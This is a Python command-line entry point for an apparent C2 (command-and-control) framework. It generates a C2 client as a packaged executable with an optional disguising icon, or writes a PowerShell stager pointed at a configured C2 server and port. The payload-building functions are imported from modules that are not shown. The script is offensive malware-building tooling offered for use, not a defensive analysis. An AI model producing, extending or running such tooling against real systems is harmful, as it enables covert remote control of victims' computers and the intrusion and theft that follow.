#!/usr/bin/env python3
"""Payload generator entry point."""
import sys
import os
import argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from config import load_config
from payloads.generator import generate_payload, generate_ps_shellcode


def main():
    parser = argparse.ArgumentParser(description="Generate C2 payload")
    parser.add_argument("-c", "--config", default=None, help="Config file path")
    parser.add_argument(
        "-f", "--format", default="exe", choices=["exe", "onefile", "onedir"],
        help="Output format (default: exe)"
    )
    parser.add_argument("-o", "--output", default="c2_client", help="Output name")
    parser.add_argument("-i", "--icon", default=None, help="Icon file path")
    parser.add_argument(
        "--ps-shellcode", action="store_true",
        help="Generate PowerShell stager instead of compiled binary"
    )
    args = parser.parse_args()

    cfg = load_config(args.config)

    if args.ps_shellcode:
        out = generate_ps_shellcode(
            {"c2_server": cfg.network.c2_server, "port": cfg.network.port},
            output_file=f"{args.output}.ps1",
        )
        print(f"PowerShell stager written to {out}")
    else:
        client_script = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "run_client.py"
        )
        hidden = cfg.payload.get("hidden_imports", []) or []
        icon = args.icon or cfg.payload.get("icon")
        result = generate_payload(
            client_script=client_script,
            output_format=args.format,
            icon_path=icon,
            hidden_imports=hidden,
            output_name=args.output,
        )
        print(f"Payload generated: {result}")


if __name__ == "__main__":
    main()
